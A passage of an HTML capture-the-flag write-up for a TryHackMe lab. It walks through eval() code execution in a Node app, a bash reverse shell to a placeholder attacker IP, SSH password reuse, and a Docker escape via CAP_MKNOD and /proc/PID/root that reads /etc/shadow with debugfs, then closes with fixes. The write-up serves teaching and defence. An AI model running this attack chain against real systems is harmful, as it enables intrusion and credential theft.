+    <p>Express is serving static files out of <code>/usr/src/app/public/</code> — we know the path because we unpacked the filesystem. So: run the command, write stdout into the static directory, then fetch it over HTTP like a normal web page.</p>
+    <pre><code><div class="ph"><span class="pl">shell — prove execution</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl -s -b <span class="cs">"connect.sid=&lt;session_cookie&gt;"</span> \
+  -X POST http://10.48.153.254:8080/time \
+  --data-urlencode <span class="cs">"time=require('fs').writeFileSync('/usr/src/app/public/out.txt', require('child_process').execSync('id').toString())"</span>
+
+curl -s http://10.48.153.254:8080/out.txt
+<span class="cg">uid=0(root) gid=0(root) groups=0(root)</span></code></pre>
+    <div class="callout yellow"><strong>Grab <code>connect.sid</code> from browser devtools after logging in as claire-r.</strong> The <code>/time</code> route is behind session auth, so an unauthenticated POST just bounces to the login page. This is why the cracked password mattered: the RCE was never reachable anonymously.</div>
+    <p><code>uid=0(root)</code>. The Node process is running as root — the container image never dropped privileges with a <code>USER</code> instruction, which is the norm far more often than it should be.</p>
+
+    <h3>Reverse shell</h3>
+    <pre><code><div class="ph"><span class="pl">shell — listener</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+nc -lvnp 4444</code></pre>
+    <pre><code><div class="ph"><span class="pl">shell — trigger</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+curl -s -b <span class="cs">"connect.sid=&lt;session_cookie&gt;"</span> \
+  -X POST http://10.48.153.254:8080/time \
+  --data-urlencode <span class="cs">"time=require('child_process').execSync('bash -c \"bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/4444 0&gt;&amp;1\"')"</span></code></pre>
+    <p>Shell lands. Root — but root of a container, which is a smaller kingdom than it sounds. <code>hostname</code> is a random hex string, <code>/proc/1/cgroup</code> mentions Docker, and the filesystem is the same one we already downloaded and read at our leisure. There is nothing in here we don't already have.</p>
+  </section>
+
+  <!-- ── 08 REUSE ── -->
+  <section class="section" id="reuse">
+    <div class="s-num">08</div>
+    <h2>Credential Reuse — Container to Host</h2>
+    <p>The container is a dead end by design; the host is the target. And the shortest path there has nothing to do with Docker at all. <code>claire-r</code> is a username in the application's database, and port 22 is open, and people reuse passwords.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ssh claire-r@10.48.153.254
+<span class="ck"># password: Password1</span>
+
+claire-r@umbrella:~$ cat user.txt
+<span class="cg">THM{[redacted]}</span></code></pre>
+    <p>A password cracked out of a web application's user table opened an SSH session on the underlying host. No exploit, no escalation — the same six characters and a digit, used twice.</p>
+    <div class="callout green"><strong>Every credential you recover is a credential to spray everywhere.</strong> Database rows, config files, git history, image metadata — the moment you have <code>user:pass</code>, try it against SSH, SMB, the VPN, the mail server, the admin panel. Credential reuse is not a CTF shortcut; it's the single most reliable lateral movement technique in real engagements, because password managers are a habit most humans never picked up.</div>
+    <p>So now we hold two positions on the same machine: <strong>root inside a container</strong>, and <strong>an unprivileged user on the host</strong>. Neither is enough on its own. Together they're everything.</p>
+  </section>
+
+  <!-- ── 09 ESCAPE ── -->
+  <section class="section" id="escape">
+    <div class="s-num">09</div>
+    <h2>Container Escape — Reading the Host's Disk Through the Wall</h2>
+    <p>This is the good part. The escape needs no kernel exploit and no CVE — just three ordinary Linux behaviours pointed at each other.</p>
+
+    <h3>The three pieces</h3>
+    <div class="steps">
+      <div class="step"><div class="sn">01</div><div class="sb"><strong><code>CAP_MKNOD</code> is in Docker's default capability set.</strong> Root inside a container can call <code>mknod</code> and create a block device node pointing at any major/minor number it likes — including the host's real disk. The device node is just a pointer; creating it is not privileged in any meaningful sense.</div></div>
+      <div class="step"><div class="sn">02</div><div class="sb"><strong>The devices cgroup blocks <em>reading</em> it — but only from inside.</strong> Docker knows about this trick and enforces a device whitelist through the cgroup. Any process inside the container's cgroup gets <code>EPERM</code> on that node. Note carefully what's being restricted: not the file, the <em>cgroup membership of the reader</em>.</div></div>
+      <div class="step"><div class="sn">03</div><div class="sb"><strong><code>/proc/&lt;PID&gt;/root</code> is a doorway from the host into any container.</strong> For every process, the kernel exposes its root directory as a symlink under <code>/proc</code>. A host process reading <code>/proc/&lt;PID&gt;/root/hostdisk</code> reaches the node we created — but does so from <em>outside</em> the container's cgroup, so the device whitelist never applies to it.</div></div>
+    </div>
+    <div class="callout red"><strong>The container walls are made of cgroups and namespaces, and <code>/proc</code> punches a hole straight through both.</strong> The device node is created where the restriction exists, and read from where it doesn't. Nothing is broken; two correct mechanisms simply don't know about each other.</div>
+    <p>The last constraint: <code>/proc/&lt;PID&gt;/root</code> is guarded by the kernel's <code>ptrace_may_access</code> check. To traverse it, the reader must either hold <code>CAP_SYS_PTRACE</code> or <strong>match the target process's UID</strong>. <code>claire-r</code> has neither capability nor root — so we make the UIDs match instead, by spawning a process inside the container that pretends to be claire-r.</p>
+
+    <h3>Step 1 — find the host's disk (in the container)</h3>
+    <pre><code><div class="ph"><span class="pl">container — root shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+cat /proc/partitions
+<span class="cg">major minor  #blocks  name
+  253     0    6549504  dm-0</span>   <span class="ck"># ← host LVM root volume, visible from inside</span></code></pre>
+    <p><code>/proc/partitions</code> is not namespaced. The container can enumerate every block device on the host — it just can't open them. Major <code>253</code>, minor <code>0</code>.</p>
+
+    <h3>Step 2 — create the device node (in the container)</h3>
+    <pre><code><div class="ph"><span class="pl">container — root shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+cd /
+mknod hostdisk b 253 0
+chmod 777 hostdisk
+<span class="ck"># reading it here fails — devices cgroup says no. Expected.</span></code></pre>
+
+    <h3>Step 3 — learn claire-r's UID (on the host)</h3>
+    <pre><code><div class="ph"><span class="pl">host — ssh</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+id
+<span class="cg">uid=1001(claire-r) gid=1001(claire-r) groups=1001(claire-r)</span></code></pre>
+
+    <h3>Step 4 — spawn a matching process (in the container)</h3>
+    <p>Node is already installed — it's the application runtime — so it's the most convenient way to drop privileges and hold a process open. Order matters: <code>setgid</code> before <code>setuid</code>, because once you've dropped UID you no longer have the privilege to change GID.</p>
+    <pre><code><div class="ph"><span class="pl">container — root shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+node -e <span class="cs">"process.setgid(1001); process.setuid(1001); require('child_process').spawn('/bin/sh', {stdio: 'inherit'});"</span></code></pre>
+    <p>A shell now runs inside the container as UID 1001. It has no special powers there — its only job is to exist, owned by the right number, with the container's root filesystem attached to it.</p>
+
+    <h3>Step 5 — find its PID <em>from the host</em></h3>
+    <pre><code><div class="ph"><span class="pl">host — ssh</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ps aux | grep <span class="cs">'/bin/sh'</span>
+<span class="cg">claire-r  2320  0.0  0.0   2608   600 ?  Ss  /bin/sh</span></code></pre>
+    <div class="callout yellow"><strong>This PID must be read on the host, not in the container.</strong> PID namespaces mean the same process has two different numbers — maybe <code>42</code> inside, <code>2320</code> outside — and <code>/proc</code> on the host only answers to the host's numbering. Grabbing the container-side PID and wondering why <code>/proc/42/root</code> is somebody else's process is the classic way to lose twenty minutes here. Note also that the host's <code>ps</code> shows the process as owned by <strong>claire-r</strong> — the host and the container share a UID space, which is precisely the property being abused.</div>
+
+    <h3>Step 6 — reach the device from outside</h3>
+    <pre><code><div class="ph"><span class="pl">host — ssh</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ls -la /proc/2320/root/hostdisk
+<span class="cg">brwxrwxrwx 1 root root 253, 0 /proc/2320/root/hostdisk</span></code></pre>
+    <p>An unprivileged host user is now holding a readable handle on the host's root volume. Same inode, same device — the only thing that changed is which side of the cgroup boundary the reader is standing on.</p>
+
+    <h3>Step 7 — read the filesystem without mounting it</h3>
+    <p><code>mount</code> would need <code>CAP_SYS_ADMIN</code>, which claire-r doesn't have. So don't mount it — parse it. <code>debugfs</code> is the ext2/3/4 debugger, it speaks the on-disk format natively, and it only needs read access to the block device.</p>
+    <pre><code><div class="ph"><span class="pl">host — ssh</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+debugfs -R <span class="cs">"cat /etc/shadow"</span> /proc/2320/root/hostdisk
+<span class="ck"># root:$6$...  — every hash on the box</span>
+
+debugfs -R <span class="cs">"cat /root/root.txt"</span> /proc/2320/root/hostdisk
+<span class="cg">THM{[redacted]}</span></code></pre>
+    <div class="callout red"><strong>File permissions are enforced by the filesystem driver — and we just went underneath it.</strong> <code>/etc/shadow</code> being <code>0640 root:shadow</code> is a rule the kernel applies when you open a path through a mounted filesystem. Reading raw blocks off the device and decoding the inodes yourself never involves that code path. Whoever can read the block device can read every file on it, and root's private keys are sitting in the same place the flag was.</div>
+    <div class="callout green"><strong>The fixes, in order of how much they'd have helped:</strong> drop <code>CAP_MKNOD</code> (<code>--cap-drop=MKNOD</code>, or better <code>--cap-drop=ALL</code> and add back only what's needed); don't run the container process as root (<code>USER node</code> in the Dockerfile); enable user namespace remapping so container UID 0 maps to an unprivileged host UID and the UID-matching trick collapses; and <code>hidepid=2</code> on <code>/proc</code> so unprivileged users can't enumerate other users' processes at all.</div>
+  </section>
+
+  <!-- ── 10 CHAIN ── -->
+  <section class="section" id="chain">
+    <div class="s-num">10</div>
+    <h2>Chain Summary &amp; Takeaways</h2>
+    <div class="chain">
+      <div class="chain-row">
+        <span class="chain-arrow">01</span>
+        <span class="chain-bug">registry API v2, no auth</span>
+        <span class="chain-gives">anonymous read on the private image store — port 5000 wide open</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">02</span>
+        <span class="chain-bug">pull layers + manifest</span>
+        <span class="chain-gives">full application source code, offline, before authenticating to anything</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">03</span>
+        <span class="chain-bug">config blob → ENV</span>
+        <span class="chain-gives">MySQL root credentials baked into image metadata at build time</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">04</span>
+        <span class="chain-bug">3306 bound to 0.0.0.0</span>
+        <span class="chain-gives">direct DB access from the internet — users table dumped</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">05</span>
+        <span class="chain-bug">unsalted MD5 + rockyou</span>
+        <span class="chain-gives">claire-r cracked instantly → login to the web application</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">06</span>
+        <span class="chain-bug">eval(request.body.time)</span>
+        <span class="chain-gives">blind RCE → output via static dir → reverse shell as root in container</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">07</span>
+        <span class="chain-bug">password reuse on SSH</span>
+        <span class="chain-gives">unprivileged foothold on the host itself — user.txt</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">08</span>
+        <span class="chain-bug">CAP_MKNOD + /proc/PID/root</span>
+        <span class="chain-gives">host block device readable from outside the cgroup</span>
+      </div>
+      <div class="chain-row">
+        <span class="chain-arrow">09</span>
+        <span class="chain-bug">debugfs on raw device</span>
+        <span class="chain-gives">/etc/shadow and /root/root.txt read straight off disk, permissions bypassed</span>
+      </div>
+    </div>
+
+    <div class="steps">
+      <div class="step"><div class="sn">T1</div><div class="sb"><strong>A container image is a filesystem and a JSON file, and people only ever grep the filesystem.</strong> Layers hold the code; the config blob holds the environment and the build history. When an image looks clean, you've probably only looked at half of it.</div></div>
+      <div class="step"><div class="sn">T2</div><div class="sb"><strong>Moving a secret out of source code and into <code>ENV</code> feels like a fix and isn't one.</strong> The credential stops being in git and starts being in an artifact that gets pushed to a registry, cached on every build agent, and pulled by everyone. Build time is the wrong time to introduce a secret — inject it at runtime.</div></div>
+      <div class="step"><div class="sn">T3</div><div class="sb"><strong>An app that offers to evaluate arithmetic is telling you it runs code.</strong> The Pro Tip banner here was a feature description and a vulnerability disclosure in the same sentence. Any "calculator" behaviour in a request field deserves a serious look at how the parsing is done.</div></div>
+      <div class="step"><div class="sn">T4</div><div class="sb"><strong>Blind RCE just needs an output channel, and web apps hand you one.</strong> A static directory you can write to turns a silent <code>eval()</code> into an interactive terminal over HTTP. Knowing the app's paths — because you pulled the image — is what makes that a ten-second step instead of a guessing game.</div></div>
+      <div class="step"><div class="sn">T5</div><div class="sb"><strong>Root in a container is a position, not a prize.</strong> The interesting question is never "am I root here" but "what does this container share with the host" — UID space, <code>/proc</code>, capabilities, the kernel itself. All four were shared here.</div></div>
+      <div class="step"><div class="sn">T6</div><div class="sb"><strong>Two weak positions compose into a strong one.</strong> Root-in-container couldn't read the disk. Unprivileged-on-host couldn't create the device node. Neither foothold was an escape by itself; the escape was the pair of them, joined by a matching UID. Enumerate what you hold together, not one shell at a time.</div></div>
+    </div>
+
+    <div class="callout yellow"><strong>Flags and room answers redacted.</strong> TryHackMe's terms prohibit publishing room answers, so the DB password and both flags stay out of this writeup. Every command above reproduces them against a live instance in a few minutes, which is the part actually worth having.</div>
+  </section>
+
+</main>
+
+<aside class="toc">
+  <div class="toc-label">Contents</div>
+  <ul>
+    <li><a href="#recon">01 — Recon</a></li>
+    <li><a href="#registry">02 — Registry API</a></li>
+    <li><a href="#layers">03 — Image Layers</a></li>
+    <li><a href="#config">04 — ENV Leak</a></li>
+    <li><a href="#mysql">05 — MySQL Dump</a></li>
+    <li><a href="#crack">06 — Crack &amp; Login</a></li>
+    <li><a href="#rce">07 — eval() RCE</a></li>
+    <li><a href="#reuse">08 — Credential Reuse</a></li>
+    <li><a href="#escape">09 — Container Escape</a></li>
+    <li><a href="#chain">10 — Chain Summary</a></li>
+  </ul>
+</aside>
+</div>
+
+<footer>
+  <div class="footer-inner">
+    <span class="footer-copy">© 2025 Maks Huseynli</span>
+    <div class="footer-links">
+      <a href="../index.html">Home</a>
+      <a href="../methodology.html">Methodology</a>
+      <a href="../about.html">About</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
